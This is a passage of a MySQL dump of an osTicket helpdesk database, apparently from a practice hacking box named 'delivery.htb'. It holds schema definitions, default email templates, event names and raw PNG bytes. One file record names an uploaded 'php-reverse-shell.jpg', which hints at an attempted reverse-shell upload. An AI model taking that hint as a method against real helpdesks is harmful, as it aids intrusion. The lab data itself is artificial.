  `smtp_port` int(6) DEFAULT NULL,
  `smtp_secure` tinyint(1) NOT NULL DEFAULT 1,
  `smtp_auth` tinyint(1) NOT NULL DEFAULT 1,
  `smtp_auth_creds` int(11) DEFAULT 0,
  `smtp_userid` varchar(255) NOT NULL,
  `smtp_userpass` varchar(255) CHARACTER SET ascii NOT NULL,
  `smtp_spoofing` tinyint(1) unsigned NOT NULL DEFAULT 0,
  `notes` text DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`email_id`),
  UNIQUE KEY `email` (`email`),
  KEY `priority_id` (`priority_id`),
  KEY `dept_id` (`dept_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_email`
--

LOCK TABLES `ost_email` WRITE;
/*!40000 ALTER TABLE `ost_email` DISABLE KEYS */;
INSERT INTO `ost_email` VALUES (1,0,2,1,0,'do-not-reply@delivery.htb','Support','','',0,'','POP','NONE',NULL,NULL,5,30,NULL,0,0,NULL,NULL,0,'',NULL,1,1,0,'','',0,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(2,0,2,1,0,'alerts@delivery.htb','osTicket Alerts','','',0,'','POP','NONE',NULL,NULL,5,30,NULL,0,0,NULL,NULL,0,'',NULL,1,1,0,'','',0,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(3,0,2,1,0,'noreply@delivery.htb','','','',0,'','POP','NONE',NULL,NULL,5,30,NULL,0,0,NULL,NULL,0,'',NULL,1,1,0,'','',0,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00');
/*!40000 ALTER TABLE `ost_email` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_email_account`
--

DROP TABLE IF EXISTS `ost_email_account`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_email_account` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(128) NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `protocol` varchar(64) NOT NULL DEFAULT '',
  `host` varchar(128) NOT NULL DEFAULT '',
  `port` int(11) NOT NULL,
  `username` varchar(128) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,
  `options` varchar(512) DEFAULT NULL,
  `errors` int(11) unsigned DEFAULT NULL,
  `created` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' ON UPDATE current_timestamp(),
  `lastconnect` timestamp NULL DEFAULT NULL,
  `lasterror` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_email_account`
--

LOCK TABLES `ost_email_account` WRITE;
/*!40000 ALTER TABLE `ost_email_account` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_email_account` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_email_template`
--

DROP TABLE IF EXISTS `ost_email_template`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_email_template` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `tpl_id` int(11) unsigned NOT NULL,
  `code_name` varchar(32) NOT NULL,
  `subject` varchar(255) NOT NULL DEFAULT '',
  `body` text NOT NULL,
  `notes` text DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `template_lookup` (`tpl_id`,`code_name`)
) ENGINE=InnoDB AUTO_INCREMENT=20 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_email_template`
--

LOCK TABLES `ost_email_template` WRITE;
/*!40000 ALTER TABLE `ost_email_template` DISABLE KEYS */;
INSERT INTO `ost_email_template` VALUES (1,1,'ticket.autoresp','Support Ticket Opened [#%{ticket.number}]','<h3><strong>Dear %{recipient.name.first},</strong></h3> <p>A request for support has been created and assigned #%{ticket.number}. A representative will follow-up with you as soon as possible. You can <a href=\"%%7Brecipient.ticket_link%7D\">view this ticket\'s progress online</a>. </p> <br /> <div style=\"color:rgb(127, 127, 127)\">Your %{company.name} Team, <br /> %{signature} </div> <hr /><div style=\"color:rgb(127, 127, 127);font-size:small\"><em>If you wish to provide additional comments or information regarding the issue, please reply to this email or <a href=\"%%7Brecipient.ticket_link%7D\"><span style=\"color:rgb(84, 141, 212)\">login to your account</span></a> for a complete archive of your support requests.</em></div>',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(2,1,'ticket.autoreply','Re: %{ticket.subject} [#%{ticket.number}]','<h3><strong>Dear %{recipient.name.first},</strong></h3> A request for support has been created and assigned ticket <a href=\"%%7Brecipient.ticket_link%7D\">#%{ticket.number}</a> with the following automatic reply <br /><br /> Topic: <strong>%{ticket.topic.name}</strong> <br /> Subject: <strong>%{ticket.subject}</strong> <br /><br /> %{response} <br /><br /><div style=\"color:rgb(127, 127, 127)\">Your %{company.name} Team,<br /> %{signature}</div> <hr /><div style=\"color:rgb(127, 127, 127);font-size:small\"><em>We hope this response has sufficiently answered your questions. If you wish to provide additional comments or information, please reply to this email or <a href=\"%%7Brecipient.ticket_link%7D\"><span style=\"color:rgb(84, 141, 212)\">login to your account</span></a> for a complete archive of your support requests.</em></div>',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(3,1,'message.autoresp','Message Confirmation','<h3><strong>Dear %{recipient.name.first},</strong></h3> Your reply to support request <a href=\"%%7Brecipient.ticket_link%7D\">#%{ticket.number}</a> has been noted <br /><br /> <div style=\"color:rgb(127, 127, 127)\">Your %{company.name} Team,<br /> %{signature} </div> <hr /><div style=\"color:rgb(127, 127, 127);font-size:small;text-align:center\"><em>You can view the support request progress <a href=\"%%7Brecipient.ticket_link%7D\">online here</a></em> </div>',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(4,1,'ticket.notice','%{ticket.subject} [#%{ticket.number}]','<h3><strong>Dear %{recipient.name.first},</strong></h3> Our customer care team has created a ticket, <a href=\"%%7Brecipient.ticket_link%7D\">#%{ticket.number}</a> on your behalf, with the following details and summary: <br /><br /> Topic: <strong>%{ticket.topic.name}</strong> <br /> Subject: <strong>%{ticket.subject}</strong> <br /><br /> %{message} <br /><br /> %{response} <br /><br /> If need be, a representative will follow-up with you as soon as possible. You can also <a href=\"%%7Brecipient.ticket_link%7D\">view this ticket\'s progress online</a>. <br /><br /> <div style=\"color:rgb(127, 127, 127)\">Your %{company.name} Team,<br /> %{signature}</div> <hr /><div style=\"color:rgb(127, 127, 127);font-size:small\"><em>If you wish to provide additional comments or information regarding the issue, please reply to this email or <a href=\"%%7Brecipient.ticket_link%7D\"><span style=\"color:rgb(84, 141, 212)\">login to your account</span></a> for a complete archive of your support requests.</em></div>',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(5,1,'ticket.overlimit','Open Tickets Limit Reached','<h3><strong>Dear %{ticket.name.first},</strong></h3> You have reached the maximum number of open tickets allowed. To be able to open another ticket, one of your pending tickets must be closed. To update or add comments to an open ticket simply <a href=\"%%7Burl%7D/tickets.php?e=%%7Bticket.email%7D\">login to our helpdesk</a>. <br /><br /> Thank you,<br /> Support Ticket System',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(6,1,'ticket.reply','Re: %{ticket.subject} [#%{ticket.number}]','<h3><strong>Dear %{recipient.name.first},</strong></h3> %{response} <br /><br /> <div style=\"color:rgb(127, 127, 127)\">Your %{company.name} Team,<br /> %{signature} </div> <hr /><div style=\"color:rgb(127, 127, 127);font-size:small;text-align:center\"><em>We hope this response has sufficiently answered your questions. If not, please do not send another email. Instead, reply to this email or <a href=\"%%7Brecipient.ticket_link%7D\" style=\"color:rgb(84, 141, 212)\">login to your account</a> for a complete archive of all your support requests and responses.</em></div>',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(7,1,'ticket.activity.notice','Re: %{ticket.subject} [#%{ticket.number}]','<h3><strong>Dear %{recipient.name.first},</strong></h3> <div><em>%{poster.name}</em> just logged a message to a ticket in which you participate. </div> <br /> %{message} <br /><br /><hr /> <div style=\"color:rgb(127, 127, 127);font-size:small;text-align:center\"><em>You\'re getting this email because you are a collaborator on ticket <a href=\"%%7Brecipient.ticket_link%7D\" style=\"color:rgb(84, 141, 212)\">#%{ticket.number}</a>. To participate, simply reply to this email or <a href=\"%%7Brecipient.ticket_link%7D\" style=\"color:rgb(84, 141, 212)\">click here</a> for a complete archive of the ticket thread.</em> </div>',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(8,1,'ticket.alert','New Ticket Alert','<h2>Hi %{recipient.name},</h2> New ticket #%{ticket.number} created <br /><br /><table><tbody><tr><td><strong>From</strong>: </td> <td>%{ticket.name} </td> </tr><tr><td><strong>Department</strong>: </td> <td>%{ticket.dept.name} </td> </tr></tbody></table><br /> %{message} <br /><br /><hr /><div>To view or respond to the ticket, please <a href=\"%%7Bticket.staff_link%7D\">login</a> to the support ticket system</div> <em style=\"font-size:small\">Your friendly Customer Support System</em> <br /><a href=\"https://osticket.com/\"><img width=\"126\" height=\"19\" style=\"width:126px\" alt=\"Powered By osTicket\" src=\"cid:b56944cb4722cc5cda9d1e23a3ea7fbc\" /></a>',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(9,1,'message.alert','New Message Alert','<h3><strong>Hi %{recipient.name},</strong></h3> New message appended to ticket <a href=\"%%7Bticket.staff_link%7D\">#%{ticket.number}</a> <br /><br /><table><tbody><tr><td><strong>From</strong>: </td> <td>%{poster.name} </td> </tr><tr><td><strong>Department</strong>: </td> <td>%{ticket.dept.name} </td> </tr></tbody></table><br /> %{message} <br /><br /><hr /><div>To view or respond to the ticket, please <a href=\"%%7Bticket.staff_link%7D\"><span style=\"color:rgb(84, 141, 212)\">login</span></a> to the support ticket system</div> <em style=\"color:rgb(127,127,127);font-size:small\">Your friendly Customer Support System</em><br /><img src=\"cid:b56944cb4722cc5cda9d1e23a3ea7fbc\" alt=\"Powered by osTicket\" width=\"126\" height=\"19\" style=\"width:126px\" />',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(10,1,'note.alert','New Internal Activity Alert','<h3><strong>Hi %{recipient.name},</strong></h3> An agent has logged activity on ticket <a href=\"%%7Bticket.staff_link%7D\">#%{ticket.number}</a> <br /><br /><table><tbody><tr><td><strong>From</strong>: </td> <td>%{note.poster} </td> </tr><tr><td><strong>Title</strong>: </td> <td>%{note.title} </td> </tr></tbody></table><br /> %{note.message} <br /><br /><hr /> To view/respond to the ticket, please <a href=\"%%7Bticket.staff_link%7D\">login</a> to the support ticket system <br /><br /><em style=\"font-size:small\">Your friendly Customer Support System</em> <br /><img src=\"cid:b56944cb4722cc5cda9d1e23a3ea7fbc\" alt=\"Powered by osTicket\" width=\"126\" height=\"19\" style=\"width:126px\" />',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(11,1,'assigned.alert','Ticket Assigned to you','<h3><strong>Hi %{assignee.name.first},</strong></h3> Ticket <a href=\"%%7Bticket.staff_link%7D\">#%{ticket.number}</a> has been assigned to you by %{assigner.name.short} <br /><br /><table><tbody><tr><td><strong>From</strong>: </td> <td>%{ticket.name} </td> </tr><tr><td><strong>Subject</strong>: </td> <td>%{ticket.subject} </td> </tr></tbody></table><br /> %{comments} <br /><br /><hr /><div>To view/respond to the ticket, please <a href=\"%%7Bticket.staff_link%7D\"><span style=\"color:rgb(84, 141, 212)\">login</span></a> to the support ticket system</div> <em style=\"font-size:small\">Your friendly Customer Support System</em> <br /><img src=\"cid:b56944cb4722cc5cda9d1e23a3ea7fbc\" alt=\"Powered by osTicket\" width=\"126\" height=\"19\" style=\"width:126px\" />',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(12,1,'transfer.alert','Ticket #%{ticket.number} transfer - %{ticket.dept.name}','<h3>Hi %{recipient.name},</h3> Ticket <a href=\"%%7Bticket.staff_link%7D\">#%{ticket.number}</a> has been transferred to the %{ticket.dept.name} department by <strong>%{staff.name.short}</strong> <br /><br /> <blockquote>%{comments} </blockquote> <hr /><div>To view or respond to the ticket, please <a href=\"%%7Bticket.staff_link%7D\">login</a> to the support ticket system. </div> <em style=\"font-size:small\">Your friendly Customer Support System</em> <br /><a href=\"https://osticket.com/\"><img width=\"126\" height=\"19\" alt=\"Powered By osTicket\" style=\"width:126px\" src=\"cid:b56944cb4722cc5cda9d1e23a3ea7fbc\" /></a>',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(13,1,'ticket.overdue','Stale Ticket Alert','<h3><strong>Hi %{recipient.name}</strong>,</h3> A ticket, <a href=\"%%7Bticket.staff_link%7D\">#%{ticket.number}</a> is seriously overdue. <br /><br /> We should all work hard to guarantee that all tickets are being addressed in a timely manner. <br /><br /> Signed,<br /> %{ticket.dept.manager.name} <hr /><div>To view or respond to the ticket, please <a href=\"%%7Bticket.staff_link%7D\"><span style=\"color:rgb(84, 141, 212)\">login</span></a> to the support ticket system. You\'re receiving this notice because the ticket is assigned directly to you or to a team or department of which you\'re a member.</div> <em style=\"font-size:small\">Your friendly <span style=\"font-size:smaller\">(although with limited patience)</span> Customer Support System</em><br /><img src=\"cid:b56944cb4722cc5cda9d1e23a3ea7fbc\" height=\"19\" alt=\"Powered by osTicket\" width=\"126\" style=\"width:126px\" />',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(14,1,'task.alert','New Task Alert','<h2>Hi %{recipient.name},</h2> New task <a href=\"%%7Btask.staff_link%7D\">#%{task.number}</a> created <br /><br /><table><tbody><tr><td><strong>Department</strong>: </td> <td>%{task.dept.name} </td> </tr></tbody></table><br /> %{task.description} <br /><br /><hr /><div>To view or respond to the ticket, please <a href=\"%%7Btask.staff_link%7D\">login</a> to the support system</div> <em style=\"font-size:small\">Your friendly Customer Support System</em> <br /><a href=\"https://osticket.com/\"><img width=\"126\" height=\"19\" style=\"width:126px\" alt=\"Powered By osTicket\" src=\"cid:b56944cb4722cc5cda9d1e23a3ea7fbc\" /></a>',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(15,1,'task.activity.notice','Re: %{task.title} [#%{task.number}]','<h3><strong>Dear %{recipient.name.first},</strong></h3> <div><em>%{poster.name}</em> just logged a message to a task in which you participate. </div> <br /> %{message} <br /><br /><hr /> <div style=\"color:rgb(127, 127, 127);font-size:small;text-align:center\"><em>You\'re getting this email because you are a collaborator on task #%{task.number}. To participate, simply reply to this email.</em> </div>',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(16,1,'task.activity.alert','Task Activity [#%{task.number}] - %{activity.title}','<h3><strong>Hi %{recipient.name},</strong></h3> Task <a href=\"%%7Btask.staff_link%7D\">#%{task.number}</a> updated: %{activity.description} <br /><br /> %{message} <br /><br /><hr /><div>To view or respond to the task, please <a href=\"%%7Btask.staff_link%7D\"><span style=\"color:rgb(84, 141, 212)\">login</span></a> to the support system</div> <em style=\"color:rgb(127,127,127);font-size:small\">Your friendly Customer Support System</em><br /><img src=\"cid:b56944cb4722cc5cda9d1e23a3ea7fbc\" alt=\"Powered by osTicket\" width=\"126\" height=\"19\" style=\"width:126px\" />',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(17,1,'task.assignment.alert','Task Assigned to you','<h3><strong>Hi %{assignee.name.first},</strong></h3> Task <a href=\"%%7Btask.staff_link%7D\">#%{task.number}</a> has been assigned to you by %{assigner.name.short} <br /><br /> %{comments} <br /><br /><hr /><div>To view/respond to the task, please <a href=\"%%7Btask.staff_link%7D\"><span style=\"color:rgb(84, 141, 212)\">login</span></a> to the support system</div> <em style=\"font-size:small\">Your friendly Customer Support System</em> <br /><img src=\"cid:b56944cb4722cc5cda9d1e23a3ea7fbc\" alt=\"Powered by osTicket\" width=\"126\" height=\"19\" style=\"width:126px\" />',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(18,1,'task.transfer.alert','Task #%{task.number} transfer - %{task.dept.name}','<h3>Hi %{recipient.name},</h3> Task <a href=\"%%7Btask.staff_link%7D\">#%{task.number}</a> has been transferred to the %{task.dept.name} department by <strong>%{staff.name.short}</strong> <br /><br /> <blockquote>%{comments} </blockquote> <hr /><div>To view or respond to the task, please <a href=\"%%7Btask.staff_link%7D\">login</a> to the support system. </div> <em style=\"font-size:small\">Your friendly Customer Support System</em> <br /><a href=\"https://osticket.com/\"><img width=\"126\" height=\"19\" alt=\"Powered By osTicket\" style=\"width:126px\" src=\"cid:b56944cb4722cc5cda9d1e23a3ea7fbc\" /></a>',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(19,1,'task.overdue.alert','Stale Task Alert','<h3><strong>Hi %{recipient.name}</strong>,</h3> A task, <a href=\"%%7Btask.staff_link%7D\">#%{task.number}</a> is seriously overdue. <br /><br /> We should all work hard to guarantee that all tasks are being addressed in a timely manner. <br /><br /> Signed,<br /> %{task.dept.manager.name} <hr /><div>To view or respond to the task, please <a href=\"%%7Btask.staff_link%7D\"><span style=\"color:rgb(84, 141, 212)\">login</span></a> to the support system. You\'re receiving this notice because the task is assigned directly to you or to a team or department of which you\'re a member.</div> <em style=\"font-size:small\">Your friendly <span style=\"font-size:smaller\">(although with limited patience)</span> Customer Support System</em><br /><img src=\"cid:b56944cb4722cc5cda9d1e23a3ea7fbc\" height=\"19\" alt=\"Powered by osTicket\" width=\"126\" style=\"width:126px\" />',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00');
/*!40000 ALTER TABLE `ost_email_template` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_email_template_group`
--

DROP TABLE IF EXISTS `ost_email_template_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_email_template_group` (
  `tpl_id` int(11) NOT NULL AUTO_INCREMENT,
  `isactive` tinyint(1) unsigned NOT NULL DEFAULT 0,
  `name` varchar(32) NOT NULL DEFAULT '',
  `lang` varchar(16) NOT NULL DEFAULT 'en_US',
  `notes` text DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  PRIMARY KEY (`tpl_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_email_template_group`
--

LOCK TABLES `ost_email_template_group` WRITE;
/*!40000 ALTER TABLE `ost_email_template_group` DISABLE KEYS */;
INSERT INTO `ost_email_template_group` VALUES (1,1,'osTicket Default Template (HTML)','en_US','Default osTicket templates','2020-12-26 09:14:00','2020-12-26 14:14:00');
/*!40000 ALTER TABLE `ost_email_template_group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_event`
--

DROP TABLE IF EXISTS `ost_event`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_event` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(60) NOT NULL,
  `description` varchar(60) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=InnoDB AUTO_INCREMENT=22 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_event`
--

LOCK TABLES `ost_event` WRITE;
/*!40000 ALTER TABLE `ost_event` DISABLE KEYS */;
INSERT INTO `ost_event` VALUES (1,'created',NULL),(2,'closed',NULL),(3,'reopened',NULL),(4,'assigned',NULL),(5,'released',NULL),(6,'transferred',NULL),(7,'referred',NULL),(8,'overdue',NULL),(9,'edited',NULL),(10,'viewed',NULL),(11,'error',NULL),(12,'collab',NULL),(13,'resent',NULL),(14,'deleted',NULL),(15,'merged',NULL),(16,'unlinked',NULL),(17,'linked',NULL),(18,'login',NULL),(19,'logout',NULL),(20,'message',NULL),(21,'note',NULL);
/*!40000 ALTER TABLE `ost_event` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_faq`
--

DROP TABLE IF EXISTS `ost_faq`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_faq` (
  `faq_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `category_id` int(10) unsigned NOT NULL DEFAULT 0,
  `ispublished` tinyint(1) unsigned NOT NULL DEFAULT 0,
  `question` varchar(255) NOT NULL,
  `answer` text NOT NULL,
  `keywords` tinytext DEFAULT NULL,
  `notes` text DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`faq_id`),
  UNIQUE KEY `question` (`question`),
  KEY `category_id` (`category_id`),
  KEY `ispublished` (`ispublished`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_faq`
--

LOCK TABLES `ost_faq` WRITE;
/*!40000 ALTER TABLE `ost_faq` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_faq` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_faq_category`
--

DROP TABLE IF EXISTS `ost_faq_category`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_faq_category` (
  `category_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `category_pid` int(10) unsigned DEFAULT NULL,
  `ispublic` tinyint(1) unsigned NOT NULL DEFAULT 0,
  `name` varchar(125) DEFAULT NULL,
  `description` text NOT NULL,
  `notes` tinytext NOT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`category_id`),
  KEY `ispublic` (`ispublic`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_faq_category`
--

LOCK TABLES `ost_faq_category` WRITE;
/*!40000 ALTER TABLE `ost_faq_category` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_faq_category` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_faq_topic`
--

DROP TABLE IF EXISTS `ost_faq_topic`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_faq_topic` (
  `faq_id` int(10) unsigned NOT NULL,
  `topic_id` int(10) unsigned NOT NULL,
  PRIMARY KEY (`faq_id`,`topic_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_faq_topic`
--

LOCK TABLES `ost_faq_topic` WRITE;
/*!40000 ALTER TABLE `ost_faq_topic` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_faq_topic` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_file`
--

DROP TABLE IF EXISTS `ost_file`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_file` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ft` char(1) NOT NULL DEFAULT 'T',
  `bk` char(1) NOT NULL DEFAULT 'D',
  `type` varchar(255) CHARACTER SET ascii NOT NULL DEFAULT '',
  `size` bigint(20) unsigned NOT NULL DEFAULT 0,
  `key` varchar(86) CHARACTER SET ascii NOT NULL,
  `signature` varchar(86) CHARACTER SET ascii COLLATE ascii_bin NOT NULL,
  `name` varchar(255) NOT NULL DEFAULT '',
  `attrs` varchar(255) DEFAULT NULL,
  `created` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `ft` (`ft`),
  KEY `key` (`key`),
  KEY `signature` (`signature`),
  KEY `type` (`type`),
  KEY `created` (`created`),
  KEY `size` (`size`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_file`
--

LOCK TABLES `ost_file` WRITE;
/*!40000 ALTER TABLE `ost_file` DISABLE KEYS */;
INSERT INTO `ost_file` VALUES (1,'T','D','image/png',9452,'b56944cb4722cc5cda9d1e23a3ea7fbc','gjMyblHhAxCQvzLfPBW3EjMUY1AmQQmz','powered-by-osticket.png',NULL,'2020-12-26 09:14:00'),(2,'T','D','text/plain',24,'73i9mMWtx86n3ccfeGGNagoRoTDtol7o','MWtx86n3ccfeGGNafaacpitTxmJ4h3Ls','osTicket.txt',NULL,'2020-12-26 09:14:00'),(3,'T','D','image/jpeg',5493,'QufsIT_bsdEBsGkxiHa2Z54t5xQJ43VI','T_bsdEBsGkxiHa2Z4rox_aPpMDWMDVCP','php-reverse-shell.jpg',NULL,'2021-01-30 16:46:16');
/*!40000 ALTER TABLE `ost_file` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_file_chunk`
--

DROP TABLE IF EXISTS `ost_file_chunk`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_file_chunk` (
  `file_id` int(11) NOT NULL,
  `chunk_id` int(11) NOT NULL,
  `filedata` longblob NOT NULL,
  PRIMARY KEY (`file_id`,`chunk_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_file_chunk`
--

LOCK TABLES `ost_file_chunk` WRITE;
/*!40000 ALTER TABLE `ost_file_chunk` DISABLE KEYS */;
INSERT INTO `ost_file_chunk` VALUES (1,0,'âPNG\r\n\Z\n\0\0\0\rIHDR\0\0\0⁄\0\0\0(\0\0\0òG‰…\0\0\nCiCCPICC profile\0\0x⁄ùSwXì˜>ﬂ˜eVBÿ±ólÅ\0\"#¨»Y¢í\0aÑ@≈Öà\nVúHUƒÇ’\nHùà‚†(∏gAäàZãU\\8Ó‹ßµ}zÔÌÌ˚◊˚ºÁúÁ¸ŒyœÄ&ëÊ¢j\09RÖ<:ÿèOHƒ…ΩÄH‡ ÊÀ¬g≈\0\0yx~t∞?¸Øo\0\0p’.$«·ˇÉ∫P&W\0 ë\0‡\"ÁêR\0».T»\0»\0∞S≥d\n\0î\0\0ly|B\"\0™\r\0ÏÙI>\0ÿ©ì‹\0ÿ¢©\0ç\0ô(G$@ª\0`UÅR,¿¬\0†¨@\".¿ÆÄY∂2GÄΩ\0véXê@`\0ÄôB,Ã\0 8\0CÕ L†0“ø‡©_pÖ∏H\0¿ÀïÕóK“3∏ï–\ZwÚ‡‚!‚¬l±Ba)f	‰\"úóõ#HÁLŒ\0\0\Z˘—¡˛8?êÁÊ‰·ÊfÁlÔÙ≈¢˛ko\">!Òﬂ˛ºå\0NœÔ⁄_ÂÂ÷p«∞uøk©[\0⁄V\0hﬂ˘]3€	†Z\n–z˘ãy8¸@û°P»<\nÌ%b°Ω0„ã>ˇ3·o‡ã~ˆ¸@˛€z\0qö@ô≠¿£É˝qanvÆRéÁÀB1n˜Á#˛«Ö˝é)—‚4±\\,äÒXâ∏P\"M«yπRëD!…ï‚È2Òñ˝	ìw\r\0¨ÜO¿N∂µÀl¿~ÓãX“v\0@~Û-å\Zë\0g42y˜\0\0ìø˘è@+\0Õó§„\0\0ºË\\®îL∆\0\0D†Å*∞A¡¨¿ú¡º¿aD@$¿<B‰Ä\n°ñAT¿:ÿµ∞\Z†ö·¥¡18\rÁ‡\\ÅÎp`û¬ºÜ	A»a!:àbéÿ\"Œôé\"aH4íÄ§ ÈàQ\"≈»r§©Bjë]H#Ú-r9ç\\@˙ê€» 2ä¸äºG1îÅ≤Q‘u@π®\Zä∆†s—t4]Äñ¢k—\Z¥=Ä∂¢ß—KËut\0}äécÄ—1fåŸa\\åáE`âX\Z&«cÂX5Vè5cX7v¿ûaÔ$ãÄÏ^Ñ¬lÇêêGXLXC®%Ï#¥∫W	ÉÑ1¬\'\"ì®O¥%z˘ƒxb:±êXF¨&Ó!!û%^\'_ìH$…í‰N\n!%ê2IIkH€H-§S§>“iúL&Îêm…ﬁ‰≤Ä¨ óë∑êêOí˚…√‰∑:≈à‚L	¢$R§îJ5e?Â•ü2Bô†™QÕ©û‘™à:üZIm†vP/Sá©4uö%ÕõCÀ§-£’–öigi˜h/Èt∫	›ÉEó–ó“kËÈÁÈÉÙw\rÜ\rÉ«Hb(k{ß∑/ôL¶”óô»T0◊2ôgòòoUX*ˆ*|ë ï:ïVï~ïÁ™TUsU?’y™T´U´^V}¶FU≥P„©	‘´’©Uª©6ÆŒRwRèPœQ_£æ_˝Ç˙c\r≤ÜÖF†ÜH£Tc∑∆ç!∆2eÒXB÷rVÎ,kòMb[≤˘ÏLv˚v/{LSCs™f¨fëfùÊqÕ∆±‡9ŸúJŒ!Œ\rŒ{--?-±÷j≠f≠~≠7⁄z⁄æ⁄bÌrÌÌÎ⁄Ôupù@ù,ùı:m:˜u	∫6∫Q∫Ö∫€uœÍ>”cÎyÈ	ı ıÈ›—GımÙ£ıÍÔ÷Ô—7046êl18cÃêcËkòi∏—Ñ·®Àh∫ëƒh£—I£\'∏&Óág„5x>f¨o